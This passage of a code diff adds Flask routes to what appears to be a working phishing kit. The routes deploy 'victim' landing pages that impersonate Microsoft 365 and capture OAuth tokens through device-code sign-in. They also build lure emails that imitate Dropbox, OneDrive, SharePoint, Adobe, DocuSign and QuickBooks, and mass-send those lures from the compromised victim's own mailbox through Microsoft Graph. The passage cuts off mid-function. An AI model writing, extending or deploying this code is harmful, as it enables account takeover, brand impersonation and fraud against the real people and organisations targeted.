+    only_deleted = request.args.get('only_deleted', 'false').lower() == 'true'
+    include_deleted = request.args.get('deleted','false').lower() == 'true' or only_deleted
+    return jsonify(_dep.get_deployments(include_deleted=include_deleted, only_deleted=only_deleted))
+
+@app.route('/api/lg/deployments', methods=['POST'])
+def lg_create_deployment():
+    data = request.json or {}
+    domain = (data.get('domain') or '').strip()
+    req_host = (request.headers.get('X-Forwarded-Host') or request.host or '').strip()
+    if req_host and not req_host.startswith(('127.0.0.1', 'localhost')):
+        if not domain or domain.startswith(('127.0.0.1', 'localhost')):
+            domain = req_host
+            data['domain'] = domain
+    if not domain:
+        return jsonify({'error':'domain is required'}), 400
+    did = _dep.create_deployment(data)
+    dep = _dep.get_deployment(did)
+    return jsonify(dep), 201
+
+@app.route('/api/lg/deployments/<int:did>', methods=['GET'])
+def lg_get_deployment(did):
+    dep = _dep.get_deployment(did)
+    return jsonify(dep) if dep else (jsonify({'error':'Not found'}), 404)
+
+@app.route('/api/lg/deployments/<int:did>', methods=['PATCH'])
+def lg_update_deployment(did):
+    _dep.update_deployment(did, request.json or {})
+    return jsonify(_dep.get_deployment(did))
+
+@app.route('/api/lg/deployments/<int:did>', methods=['DELETE'])
+def lg_delete_deployment(did):
+    hard = request.args.get('hard','false').lower() == 'true'
+    if hard:
+        _dep.hard_delete_deployment(did)
+    else:
+        _dep.soft_delete_deployment(did)
+    return jsonify({'success': True})
+
+@app.route('/api/lg/deployments/batch-delete', methods=['POST'])
+def lg_batch_delete_deployments():
+    """Bulk soft-delete or hard-delete a list of deployment IDs."""
+    data = request.json or {}
+    ids = data.get('ids', [])
+    hard = data.get('hard', False)
+    if not isinstance(ids, list):
+        return jsonify({'error': 'ids must be a list'}), 400
+    for did in ids:
+        try:
+            if hard:
+                _dep.hard_delete_deployment(int(did))
+            else:
+                _dep.soft_delete_deployment(int(did))
+        except Exception as e:
+            logger.warning(f"Error deleting deployment {did}: {e}")
+    return jsonify({'success': True, 'count': len(ids)})
+
+@app.route('/api/lg/deployments/<int:did>/deploy', methods=['POST'])
+def lg_deploy(did):
+    """Render + activate a deployment and return the victim URL."""
+    result = _dep.deploy(did)
+    if result.get('error'):
+        return jsonify(result), 400
+    return jsonify({'success': True, 'url': result.get('full_url'), 'deployment': result})
+
+@app.route('/api/lg/deployments/<int:did>/pause', methods=['POST'])
+def lg_pause_deployment(did):
+    _dep.update_deployment(did, {'status': 'paused'})
+    return jsonify({'success': True})
+
+@app.route('/api/lg/deployments/<int:did>/resume', methods=['POST'])
+def lg_resume_deployment(did):
+    _dep.update_deployment(did, {'status': 'active'})
+    return jsonify({'success': True})
+
+@app.route('/api/lg/deployments/<int:did>/hits', methods=['GET'])
+def lg_deployment_hits(did):
+    return jsonify(_dep.get_deployment_hits(did))
+
+# ─── Victim-facing routes ────────────────────────────────────────────────────
+# Route: GET /lp/<slug>              → pre-land page
+# Route: GET /lp/<slug>/l            → landing (ICEBADGER device-code page or proxy)
+# Route: GET /lp/<slug>/s            → success redirect
+
+def resolve_deployment(host_header, path_slug):
+    """
+    Intelligently match incoming request to an active deployment:
+    1. Parse host: strip port and protocol.
+    2. Try matching exact (domain, subdomain, path).
+    3. Try matching exact (domain, path) with empty/wildcard subdomain.
+    4. Try matching clean_host directly as domain.
+    5. Fallback to path only (for localhost testing and ngrok).
+    """
+    clean_host = (host_header or '').split(':')[0].strip().lower()
+    clean_host = re.sub(r'^https?://', '', clean_host).split('/')[0].strip()
+    path_clean = (path_slug or '').strip('/').lower()
+    for suffix in ['/l', '/s']:
+        if path_clean.endswith(suffix):
+            path_clean = path_clean[:-len(suffix)]
+
+    parts = clean_host.split('.')
+    cand_sub = ''
+    cand_dom = clean_host
+    if len(parts) >= 3 and not (parts[0].isdigit() and parts[-1].isdigit()):
+        cand_sub = parts[0]
+        cand_dom = '.'.join(parts[1:])
+
+    conn = sqlite3.connect(Config.DB_PATH)
+    conn.row_factory = sqlite3.Row
+
+    # 1. Exact match on domain, subdomain, path
+    if cand_sub:
+        dep = conn.execute(
+            "SELECT * FROM deployments WHERE domain=? AND subdomain=? AND path=? AND status='active' ORDER BY id DESC LIMIT 1",
+            (cand_dom, cand_sub, path_clean)
+        ).fetchone()
+        if dep:
+            conn.close()
+            return dict(dep)
+
+    # 2. Match domain + path where subdomain is blank or null
+    dep = conn.execute(
+        "SELECT * FROM deployments WHERE domain=? AND (subdomain='' OR subdomain IS NULL) AND path=? AND status='active' ORDER BY id DESC LIMIT 1",
+        (cand_dom, path_clean)
+    ).fetchone()
+    if dep:
+        conn.close()
+        return dict(dep)
+
+    # 3. Match clean_host directly as domain
+    dep = conn.execute(
+        "SELECT * FROM deployments WHERE domain=? AND path=? AND status='active' ORDER BY id DESC LIMIT 1",
+        (clean_host, path_clean)
+    ).fetchone()
+    if dep:
+        conn.close()
+        return dict(dep)
+
+    # 4. Fallback match by path only (for local dev, ngrok tunnels)
+    dep = conn.execute(
+        "SELECT * FROM deployments WHERE path=? AND status='active' ORDER BY id DESC LIMIT 1",
+        (path_clean,)
+    ).fetchone()
+    conn.close()
+    return dict(dep) if dep else None
+
+@app.route('/lp/<path:slug>', methods=['GET'])
+@require_human_gate
+def serve_preland(slug):
+    """Serve the pre-landing page for a deployment, keyed by its path slug."""
+    path_only = slug.rstrip('/')
+    for suffix in ['/l', '/s']:
+        if path_only.endswith(suffix):
+            path_only = path_only[:-len(suffix)]
+
+    dep = resolve_deployment(request.host, path_only)
+    if not dep:
+        return '<h1>Not found</h1>', 404
+
+    pcfg = {}
+    try: pcfg = json.loads(dep.get('preland_config') or '{}')
+    except Exception: pass
+
+    # If pre-landing is disabled, None, or unconfigured, serve the landing page directly!
+    if not dep.get('preland_template_id') or pcfg.get('enabled') is False or pcfg.get('disabled') is True or not dep.get('preland_html_cache'):
+        return serve_landing(path_only)
+
+    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    visitor_ua = request.headers.get('User-Agent','')
+    _dep.log_hit(dep['id'], visitor_ip, visitor_ua, 'preland', is_bot=0)
+
+    html = dep.get('preland_html_cache','')
+    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}
+
+
+@app.route('/lp/<path:slug>/l', methods=['GET'])
+@require_human_gate
+def serve_landing(slug):
+    """
+    Victim landing page.
+    - Creates a fresh CRIMSON PAW device-code session.
+    - Renders the branded landing page HTML with the verification code embedded.
+    - Victim sees the page, copies code, clicks 'Sign in with Microsoft'.
+    - CRIMSON PAW backend polls for token capture.
+    """
+    path_only = slug.rstrip('/')
+    dep = resolve_deployment(request.host, path_only)
+    if not dep:
+        return '<h1>Not found</h1>', 404
+
+    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    visitor_ua = request.headers.get('User-Agent', '')
+    _dep.log_hit(dep['id'], visitor_ip, visitor_ua, 'landing', is_bot=0)
+
+    landing_template_id  = dep.get('landing_template_id')
+
+    # Build the merged config for this deployment
+    default_cfg = {}
+    landing_cfg = {}
+    try:
+        if dep.get('landing_template_id'):
+            tconn = sqlite3.connect(Config.DB_PATH)
+            trow = tconn.execute("SELECT config FROM templates WHERE id=? LIMIT 1", (dep['landing_template_id'],)).fetchone()
+            tconn.close()
+            if trow and trow[0]:
+                default_cfg = json.loads(trow[0])
+    except Exception: pass
+    try:
+        if dep.get('landing_config'):
+            landing_cfg = json.loads(dep['landing_config'])
+    except Exception: pass
+    merged_cfg = {**default_cfg, **landing_cfg}
+    landing_template_name = landing_cfg.get('template_name')
+    if not landing_template_name and dep.get('landing_template_id'):
+        tconn = sqlite3.connect(Config.DB_PATH)
+        trow = tconn.execute("SELECT name FROM templates WHERE id=? LIMIT 1", (dep['landing_template_id'],)).fetchone()
+        tconn.close()
+        if trow and trow[0]:
+            landing_template_name = trow[0]
+    if not landing_template_name and dep.get('preland_template_id'):
+        tconn = sqlite3.connect(Config.DB_PATH)
+        ptrow = tconn.execute("SELECT name FROM preland_templates WHERE id=? LIMIT 1", (dep['preland_template_id'],)).fetchone()
+        tconn.close()
+        if ptrow and ptrow[0]:
+            landing_template_name = ptrow[0]
+    if not landing_template_name:
+        landing_template_name = 'Microsoft 365'
+
+    # Create a new ICEBADGER capture session for this victim
+    user_code       = 'ABCD-1234'
+    verification_uri = 'https://microsoft.com/devicelogin'
+    try:
+        uc, dc, vu, _ = oauth.request_device_code()
+        if uc and dc:
+            user_code = uc
+            verification_uri = vu or verification_uri
+            complete_url = f"https://login.microsoftonline.com/common/oauth2/deviceauth?user_code={uc}"
+            db.create_session(
+                uc,
+                dc,
+                verification_uri,
+                landing_template_id,
+                complete_url,
+                client_ip=visitor_ip,
+                user_agent=visitor_ua,
+            )
+    except Exception as e:
+        logger.error(f'serve_landing error: {e}')
+
+    # Resolve landing mode and GeoIP for Mode A
+    landing_mode = (dep.get('landing_mode') or merged_cfg.get('landing_mode') or 'S').upper()
+    victim_location = ''
+    if landing_mode == 'A' or merged_cfg.get('show_left_panel'):
+        try:
+            victim_location = _dep._geoip(visitor_ip)
+        except Exception:
+            victim_location = ''
+
+    branded_success_url = f"/lp/{path_only}/s"
+    html = _dep.render_landing(
+        landing_template_name, merged_cfg, user_code, verification_uri, branded_success_url,
+        mode=landing_mode, victim_ip=visitor_ip, victim_location=victim_location
+    )
+    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}
+
+
+@app.route('/api/lp/session-status/<user_code>', methods=['GET'])
+def lp_session_status(user_code):
+    """Public lightweight status check for live landing page auto-redirect on token capture."""
+    if user_code in ('ABCD-1234', 'MOCK', 'PREVIEW') or user_code.startswith('PREVIEW-'):
+        return jsonify({'status': 'PREVIEW', 'user_code': user_code}), 200
+
+    s = db.get_session_by_user_code(user_code)
+    if not s:
+        return jsonify({'status': 'NOT_FOUND'}), 404
+    return jsonify({
+        'status': s.get('status', 'PENDING'),
+        'user_code': user_code
+    })
+
+
+@app.route('/lp/<path:slug>/s', methods=['GET'])
+def serve_success(slug):
+    """Serve the branded success page with auto-redirect."""
+    path_only = slug.rstrip('/')
+    for suffix in ['/s']:
+        if path_only.endswith(suffix):
+            path_only = path_only[:-len(suffix)]
+
+    dep = resolve_deployment(request.host, path_only)
+    success_url = 'https://www.office.com/'
+    success_template_name = 'Microsoft 365'
+    merged_cfg = {}
+
+    if dep:
+        visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        _dep.log_hit(dep['id'], visitor_ip, request.headers.get('User-Agent', ''), 'success', is_bot=0)
+        success_url = dep.get('success_url') or success_url
+        
+        # Check template from success_config, success_template_id, landing_config, landing_template_id, or preland_template_id
+        if dep.get('success_config'):
+            try:
+                s_cfg = json.loads(dep['success_config'])
+                if s_cfg.get('template_name'):
+                    success_template_name = s_cfg['template_name']
+                merged_cfg.update(s_cfg)
+            except Exception: pass
+        elif dep.get('success_template_id') or dep.get('landing_template_id') or dep.get('preland_template_id'):
+            with sqlite3.connect(Config.DB_PATH) as conn:
+                conn.row_factory = sqlite3.Row
+                if dep.get('success_template_id'):
+                    trow = conn.execute("SELECT name FROM templates WHERE id=? LIMIT 1", (dep['success_template_id'],)).fetchone()
+                    if trow and trow['name']:
+                        success_template_name = trow['name']
+                elif dep.get('landing_template_id'):
+                    trow = conn.execute("SELECT name FROM templates WHERE id=? LIMIT 1", (dep['landing_template_id'],)).fetchone()
+                    if trow and trow['name']:
+                        success_template_name = trow['name']
+                elif dep.get('preland_template_id'):
+                    ptrow = conn.execute("SELECT name FROM preland_templates WHERE id=? LIMIT 1", (dep['preland_template_id'],)).fetchone()
+                    if ptrow and ptrow['name']:
+                        success_template_name = ptrow['name']
+
+        try:
+            pt = _dep.get_preland_template(dep.get('preland_template_id'))
+            if pt and pt.get('default_config'):
+                for k, v in json.loads(pt['default_config']).items():
+                    merged_cfg.setdefault(k, v)
+        except Exception: pass
+        try:
+            if dep.get('preland_config'):
+                merged_cfg.update(json.loads(dep['preland_config']))
+        except Exception: pass
+        try:
+            if dep.get('landing_config'):
+                merged_cfg.update(json.loads(dep['landing_config']))
+        except Exception: pass
+        try:
+            if dep.get('success_config'):
+                merged_cfg.update(json.loads(dep['success_config']))
+        except Exception: pass
+
+    html = _dep.render_success(success_template_name, merged_cfg, success_url)
+    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}
+
+
+RESERVED_ROOT_PATHS = {'static', 'api', 'dashboard', 'landing', 'app', 'mailbox', 'extractor', 'b2b', 'lp', 'favicon.ico'}
+
+@app.route('/<path:slug>', methods=['GET'])
+@require_human_gate
+def serve_root_slug(slug):
+    """Direct root routing for deployed links (e.g. /verify, /onedrive, /m365)."""
+    first_part = slug.split('/')[0].lower()
+    if first_part in RESERVED_ROOT_PATHS:
+        return '<h1>Not found</h1>', 404
+
+    path_only = slug.rstrip('/')
+    if path_only.endswith('/s'):
+        return serve_success(path_only[:-2])
+    elif path_only.endswith('/l'):
+        return serve_landing(path_only[:-2])
+    else:
+        return serve_preland(path_only)
+
+
+# ════════════════════════════════════════════════════════════════
+# B2B SENDER ROUTES
+# ════════════════════════════════════════════════════════════════
+
+def _b2b_suggested_subjects(brand, dep_name=''):
+    b = ((brand or '') + ' ' + (dep_name or '')).lower()
+    if 'dropbox' in b:
+        return (
+            '[NAME], shared "Proposal-v2.pptx" with you on Dropbox\n'
+            '[NAME], a file has been shared with you via Dropbox\n'
+            'Action Required: View shared file on Dropbox'
+        )
+    elif 'onedrive' in b:
+        return (
+            '[NAME] shared a secure document with you on OneDrive\n'
+            '[NAME], Important OneDrive shared file: Action Required\n'
+            'Review requested: Protected document via OneDrive'
+        )
+    elif 'sharepoint' in b:
+        return (
+            '[NAME], Review requested: SharePoint Document\n'
+            '[NAME], You have received a new document in SharePoint\n'
+            'Shared File: SharePoint Document for [COMPANY]'
+        )
+    elif 'adobe' in b:
+        return (
+            '[NAME], Please sign: Agreement pending your signature\n'
+            'Adobe Acrobat: Signature requested on document\n'
+            'Action Required: Document ready for review'
+        )
+    elif 'docusign' in b:
+        return (
+            '[NAME], Please DocuSign: Document pending your signature\n'
+            'DocuSign: Important document waiting for completion\n'
+            'Action Required: Complete signing session for [COMPANY]'
+        )
+    elif 'quickbooks' in b:
+        return (
+            'Invoice #[DOMAIN]-4910 from [COMPANY] is ready for review\n'
+            'QuickBooks: Notification regarding your recent billing receipt\n'
+            'Action Required: Review updated invoice from [COMPANY]'
+        )
+    elif 'outlook' in b or 'm365' in b or 'microsoft' in b:
+        return (
+            '[NAME], Important update regarding your Microsoft 365 access\n'
+            'Action Required: Re-verify organization shared document\n'
+            '[COMPANY] Security Notice: Review organizational message'
+        )
+    else:
+        return (
+            '[NAME], Important update regarding your document access\n'
+            '[NAME], Shared document ready for review\n'
+            'Action Required: Secure document from [COMPANY]'
+        )
+
+
+def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
+    """Return a clean, authentic email card that fits neatly inside the editor box without wallpaper/blur backgrounds."""
+    import assets
+    cfg = cfg or {}
+    b = (brand or '').lower()
+    
+    if 'dropbox' in b:
+        accent = '#0061FF'
+        badge = cfg.get('doc_badge', 'PDF')
+        title = cfg.get('title', 'Dropbox File Shared')
+        desc = cfg.get('description', 'A confidential document has been shared with you via Dropbox. Verify your identity to access.')
+        doc_name = cfg.get('doc_name', 'Proposal-Shared.pdf')
+        doc_sub = cfg.get('doc_sub', 'Dropbox Cloud Storage · 4.2 MB · Restricted to [EMAIL]')
+        btn_label = cfg.get('button_label', 'View on Dropbox')
+        foot1 = cfg.get('footer_caption', 'Sign in to Dropbox to access · Link expires in 48h')
+        foot2 = cfg.get('footer_text', 'Dropbox, Inc. · Secure Cloud Storage')
+        border = '#e2e8f0'
+        btn_radius = '6px'
+        logo = assets.get_logo_html('Dropbox', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+    elif 'sharepoint' in b:
+        accent = '#038387'
+        badge = cfg.get('doc_badge', 'PDF')
+        title = cfg.get('title', 'SharePoint Document Request')
+        desc = cfg.get('description', 'A secure document has been transmitted to you on SharePoint. Access requires organization verification.')
+        doc_name = cfg.get('doc_name', 'SharePoint-Document-Review.pdf')
+        doc_sub = cfg.get('doc_sub', 'SharePoint Online · Shared with [COMPANY]')
+        btn_label = cfg.get('button_label', 'Open in SharePoint')
+        foot1 = cfg.get('footer_caption', 'Microsoft SharePoint Online · Intended for [EMAIL]')
+        foot2 = cfg.get('footer_text', 'Microsoft Corporation · Secure Transmission')
+        border = '#e2e8f0'
+        btn_radius = '4px'
+        logo = assets.get_logo_html('SharePoint', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+    elif 'onedrive' in b:
+        accent = '#0078D4'
+        badge = cfg.get('doc_badge', 'DOCX')
+        title = cfg.get('title', 'OneDrive Document Shared')
+        desc = cfg.get('description', 'This protected document requires your organization identity verification to review.')
+        doc_name = cfg.get('doc_name', 'Protected-Document.docx')
+        doc_sub = cfg.get('doc_sub', 'OneDrive Cloud Storage · Access restricted to [EMAIL]')
+        btn_label = cfg.get('button_label', 'Access Protected File')
+        foot1 = cfg.get('footer_caption', 'This link is protected and expires in 48 hours')
+        foot2 = cfg.get('footer_text', 'Microsoft Corporation · One Microsoft Way, Redmond, WA')
+        border = '#e2e8f0'
+        btn_radius = '4px'
+        logo = assets.get_logo_html('OneDrive', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+    elif 'adobe' in b:
+        accent = '#FA0F00'
+        badge = cfg.get('doc_badge', 'PDF')
+        title = cfg.get('title', 'Adobe Acrobat Sign')
+        desc = cfg.get('description', 'Please review and electronically sign this document for [COMPANY].')
+        doc_name = cfg.get('doc_name', 'Agreement-Review.pdf')
+        doc_sub = cfg.get('doc_sub', 'Adobe Acrobat Sign · Sent to [EMAIL]')
+        btn_label = cfg.get('button_label', 'Review and Sign')
+        foot1 = cfg.get('footer_caption', 'Secured with Adobe 256-bit encryption')
+        foot2 = cfg.get('footer_text', 'Adobe Systems Software Ireland Limited')
+        border = '#e5e7eb'
+        btn_radius = '20px'
+        logo = assets.get_logo_html('Adobe', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+    elif 'docusign' in b:
+        accent = '#FFCE00'
+        badge = cfg.get('doc_badge', 'DOC')
+        title = cfg.get('title', 'DocuSign Document Pending')
+        desc = cfg.get('description', '[COMPANY] has sent you a document to review and complete signing.')
+        doc_name = cfg.get('doc_name', 'Contract-Agreement.pdf')
+        doc_sub = cfg.get('doc_sub', 'DocuSign Electronic Signature · Recipient: [EMAIL]')
+        btn_label = cfg.get('button_label', 'Review Document')
+        foot1 = cfg.get('footer_caption', 'Powered by DocuSign Ink · Legally Binding Signature')
+        foot2 = cfg.get('footer_text', 'DocuSign, Inc. · Electronic Record and Signature Disclosure')
+        border = '#e5e7eb'
+        btn_radius = '4px'
+        logo = assets.get_logo_html('DocuSign', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+    elif 'quickbooks' in b:
+        accent = '#2CB34A'
+        badge = cfg.get('doc_badge', 'INV')
+        title = cfg.get('title', 'QuickBooks Invoice')
+        desc = cfg.get('description', 'Invoice #[DOMAIN]-4910 from [COMPANY] is ready for review.')
+        doc_name = cfg.get('doc_name', 'Invoice-Details.pdf')
+        doc_sub = cfg.get('doc_sub', 'Intuit QuickBooks Online · Amount Due: $1,420.00')
+        btn_label = cfg.get('button_label', 'View Invoice')
+        foot1 = cfg.get('footer_caption', 'Intuit Payment Network · Secure Billing Link')
+        foot2 = cfg.get('footer_text', 'Intuit Inc. · All rights reserved')
+        border = '#e5e7eb'
+        btn_radius = '4px'
+        logo = assets.get_logo_html('QuickBooks', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+    else:
+        accent = '#0078D4'
+        badge = cfg.get('doc_badge', 'FILE')
+        title = cfg.get('title', 'Protected Document')
+        desc = cfg.get('description', 'A secure document has been transmitted to you. Access requires organization verification.')
+        doc_name = cfg.get('doc_name', 'Protected-Document.pdf')
+        doc_sub = cfg.get('doc_sub', 'Encrypted File · Intended for [EMAIL]')
+        btn_label = cfg.get('button_label', 'Access Document')
+        foot1 = cfg.get('footer_caption', 'End-to-end encrypted notification for [COMPANY]')
+        foot2 = cfg.get('footer_text', 'Secure Communications System')
+        border = '#e2e8f0'
+        btn_radius = '6px'
+        logo = assets.get_logo_html('Microsoft 365', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+
+    badge_text = '#111111' if accent == '#FFCE00' else '#ffffff'
+    btn_text = '#111111' if accent == '#FFCE00' else '#ffffff'
+
+    return f'''<div class="b2b-card-outer" style="max-width:350px;width:350px;margin:12px auto;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
+  <p style="margin:0 0 10px;font-size:13.5px;color:#1e293b;line-height:1.4;">Hello [NAME],</p>
+  <div class="b2b-email-card" style="width:100%;max-width:350px;background:#ffffff;border:1px solid {border};border-radius:12px;box-shadow:0 4px 22px rgba(0,0,0,0.08);padding:22px 18px 16px;text-align:center;box-sizing:border-box;">
+    {logo}
+    <h2 style="font-size:16.5px;font-weight:700;color:#0f172a;margin:10px 0 5px;line-height:1.3;letter-spacing:-0.2px;">{title}</h2>
+    <p style="font-size:12.5px;color:#64748b;margin:0 0 14px;line-height:1.45;">{desc}</p>
+    <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:7px;padding:9px 12px;display:flex;align-items:center;gap:10px;margin:0 0 15px;text-align:left;box-sizing:border-box;">
+      <span style="background:{accent};color:{badge_text};font-size:10.5px;font-weight:700;padding:2px 6px;border-radius:4px;flex-shrink:0;letter-spacing:0.4px;">{badge}</span>
+      <div style="overflow:hidden;flex:1;">
+        <div style="font-size:12.5px;font-weight:600;color:#1e293b;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">{doc_name}</div>
+        <div style="font-size:10.5px;color:#94a3b8;margin-top:1px;">{doc_sub}</div>
+      </div>
+    </div>
+    <div style="margin:14px 0 10px;">
+      <a href="{proceed_url}" target="_blank" style="display:flex;align-items:center;justify-content:center;gap:6px;width:100%;box-sizing:border-box;background-color:{accent};color:{btn_text} !important;text-decoration:none;font-weight:600;font-size:13.5px;padding:10px 18px;border-radius:{btn_radius};box-shadow:0 2px 8px rgba(0,0,0,0.12);transition:opacity 0.15s;">🔒 {btn_label}</a>
+    </div>
+    <div style="border-top:1px solid #f1f5f9;margin-top:14px;padding-top:10px;">
+      <div style="font-size:11px;color:#94a3b8;margin-bottom:2px;">{foot1}</div>
+      <div style="font-size:10.5px;color:#cbd5e1;">🔒 {foot2}</div>
+    </div>
+  </div>
+  <p style="margin:10px 0 0;font-size:12px;color:#64748b;line-height:1.4;"><br></p>
+</div>'''
+
+
+@app.route('/api/b2b/deployment_template/<int:did>', methods=['GET'])
+def b2b_deployment_template(did):
+    """Return the contained email card template HTML and details for a deployment."""
+    dep = _dep.get_deployment(did)
+    if not dep:
+        return jsonify({'error': 'Deployment not found'}), 404
+
+    brand = dep.get('preland_name') or dep.get('landing_name') or dep.get('name') or 'Document Share'
+    full_url = dep.get('full_url') or (f"http://{dep.get('domain')}/{dep.get('path')}" if dep.get('domain') and dep.get('path') else '')
+
+    merged_cfg = {}
+    if dep.get('preland_default_config'):
+        try: merged_cfg.update(json.loads(dep['preland_default_config']))
+        except Exception: pass
+    if dep.get('preland_config'):
+        try: merged_cfg.update(json.loads(dep['preland_config']))
+        except Exception: pass
+
+    # Build the clean, contained email card (without wallpaper or blur background)
+    html = build_b2b_email_card(brand, cfg=merged_cfg, proceed_url='[LINK]')
+    subjects = _b2b_suggested_subjects(brand, dep.get('name', ''))
+
+    return jsonify({
+        'id': dep.get('id'),
+        'name': dep.get('name'),
+        'brand': brand,
+        'full_url': full_url,
+        'html': html,
+        'subjects': subjects
+    })
+
+
+@app.route('/api/b2b/preview_template', methods=['GET', 'POST'])
+def b2b_preview_template():
+    """Render authentic contained email card HTML for any brand or direct link."""
+    data = request.json if request.is_json else request.args
+    brand = data.get('brand', 'OneDrive')
+    url = data.get('url', 'https://example.com/share')
+
+    html = build_b2b_email_card(brand, cfg={}, proceed_url='[LINK]')
+    subjects = _b2b_suggested_subjects(brand)
+
+    return jsonify({
+        'brand': brand,
+        'url': url,
+        'html': html,
+        'subjects': subjects
+    })
+
+
+@app.route('/api/b2b/send', methods=['POST'])
+def b2b_send():
+    """Stream email sends via Graph /me/sendMail using a captured account token."""
+    import time as _time
+    import json as _json
+
+    data = request.json or {}
+    uc      = data.get('user_code', '').strip()
+    s       = db.get_session_by_user_code(uc)
+
+    def _err(msg):
+        yield f'data: {{"type":"status","msg":"{msg}","cls":"error"}}\n\n'
+        yield 'data: {"type":"done","sent":0,"failed":0}\n\n'
+
+    if not s or s.get('status') != 'CAPTURED':
+        return Response(stream_with_context(_err('Invalid or non-captured session')), mimetype='text/event-stream')
+
+    token       = db.get_graph_access_token(s)
+    recipients  = data.get('recipients', [])
+    subjects    = data.get('subjects', []) or ['(No Subject)']
+    links       = data.get('links', [])
+    body_html   = data.get('body_html', '')
+    subj_rot    = max(1, int(data.get('subject_rotate_n', 1)))
+    link_rot    = max(1, int(data.get('link_rotate_n', 1)))
+    priority    = data.get('priority', 'normal').lower()
+    delay_ms    = max(0, int(data.get('delay_ms', 0)))
+    bcc_mode    = bool(data.get('bcc_mode', False))
+    save_sent   = bool(data.get('save_sent', True))
+    attachments = data.get('attachments', [])
+
+    # Resolve sender's own email so we can filter it out of recipients
+    sender_email = (s.get('victim_email') or '').strip().lower()
+
+    def generate():
+        def sse(obj):
+            return f'data: {_json.dumps(obj)}\n\n'
+
+        sent = failed = 0
+
+        if bcc_mode:
+            # ── BATCH BCC MODE: Blast all recipients simultaneously in batches of 50 ──
+            BATCH_SIZE = 50
+            valid_recipients = [r.strip().lower() for r in recipients if r.strip() and '@' in r]
+            sender_addr = s.get('victim_email') or sender_email or 'me'
+
+            for batch_start in range(0, len(valid_recipients), BATCH_SIZE):
+                batch = valid_recipients[batch_start : batch_start + BATCH_SIZE]
+                batch_num = (batch_start // BATCH_SIZE) + 1
+                total_batches = (len(valid_recipients) + BATCH_SIZE - 1) // BATCH_SIZE
+
+                subj_idx = (batch_start // BATCH_SIZE) % len(subjects)
+                subj = subjects[subj_idx].strip()
+                link = (links[(batch_start // BATCH_SIZE) % len(links)].strip() if links else '')
+                date_str = datetime.datetime.now().strftime('%B %d, %Y')
+
+                def merge_bcc(text):
+                    return (text
+                        .replace('[NAME]', 'Valued Client')
+                        .replace('{NAME}', 'Valued Client')
+                        .replace('{name}', 'Valued Client')
+                        .replace('[FIRST_NAME]', 'Valued Client')
+                        .replace('{FIRST_NAME}', 'Valued Client')
+                        .replace('{first_name}', 'Valued Client')
+                        .replace('[LINK]', link).replace('{LINK}', link).replace('{link}', link)
+                        .replace('[URL]', link).replace('{URL}', link).replace('{url}', link)
+                        .replace('[DATE]', date_str).replace('{DATE}', date_str).replace('{date}', date_str))
+
+                subj_final = merge_bcc(subj)
+                body_final = merge_bcc(body_html)
+
+                msg_obj = {
+                    'subject': subj_final,
+                    'body': {'contentType': 'HTML', 'content': body_final},
+                    'toRecipients': [{'emailAddress': {'address': sender_addr}}],
+                    'bccRecipients': [{'emailAddress': {'address': r}} for r in batch],
+                    'importance': priority
+                }
+                if attachments:
+                    msg_obj['attachments'] = attachments
+
+                try:
+                    res = graph.make_graph_request(
+                        '/me/sendMail', token,
+                        method='POST',
+                        payload={'message': msg_obj, 'saveToSentItems': save_sent}
+                    )
+                    if res is None or not res.get('error'):
+                        sent += len(batch)
+                        for r in batch:
+                            yield sse({'type': 'sent', 'recipient': r, 'subject': f"{subj_final} [Batch {batch_num}/{total_batches}]"})
+                    else:
+                        failed += len(batch)
+                        err_msg = res.get('error', {}).get('message', 'Send failed')
+                        for r in batch:
+                            yield sse({'type': 'failed', 'recipient': r, 'error': err_msg})
+                except Exception as ex:
+                    failed += len(batch)
+                    for r in batch:
+                        yield sse({'type': 'failed', 'recipient': r, 'error': str(ex)})
+
+                if delay_ms > 0 and (batch_start + BATCH_SIZE) < len(valid_recipients):
+                    time.sleep(delay_ms / 1000.0)
+
+        else:
+            # ── DIRECT 1-to-1 SENDING MODE ──
+            for i, rec in enumerate(recipients):
+                rec = rec.strip().lower()
+                if not rec or '@' not in rec:
+                    continue
+
+                # Rotate subject and link
+                subj    = subjects[(i // subj_rot) % len(subjects)].strip()
+                link    = (links[(i // link_rot) % len(links)].strip() if links else '')
+
+                # Merge tags
+                name    = rec.split('@')[0]
+                domain  = rec.split('@')[1]
+                company = domain.split('.')[0].title()
+                first_name = name.split('.')[0].title()
+                date_str = datetime.datetime.now().strftime('%B %d, %Y')
+
+                def merge(text):
+                    return (text
+                        .replace('[NAME]', name.replace('.', ' ').title())
+                        .replace('{NAME}', name.replace('.', ' ').title())
+                        .replace('{name}', name.replace('.', ' ').title())
+                        .replace('[FIRST_NAME]', first_name)
+                        .replace('{FIRST_NAME}', first_name)
+                        .replace('{first_name}', first_name)
+                        .replace('[EMAIL]', rec)
+                        .replace('{EMAIL}', rec)
+                        .replace('{email}', rec)
+                        .replace('[DOMAIN]', domain)
+                        .replace('{DOMAIN}', domain)
+                        .replace('{domain}', domain)
+                        .replace('[COMPANY]', company)
+                        .replace('{COMPANY}', company)
+                        .replace('{company}', company)
+                        .replace('[LINK]', link)
+                        .replace('{LINK}', link)
+                        .replace('{link}', link)
+                        .replace('[URL]', link)
+                        .replace('{URL}', link)
+                        .replace('{url}', link)
+                        .replace('[DATE]', date_str)
+                        .replace('{DATE}', date_str)
+                        .replace('{date}', date_str))
+
+                subj_final = merge(subj)
+                body_final = merge(body_html)
+
+                to_rec  = [{'emailAddress': {'address': rec}}]
+                msg_obj = {
+                    'subject': subj_final,
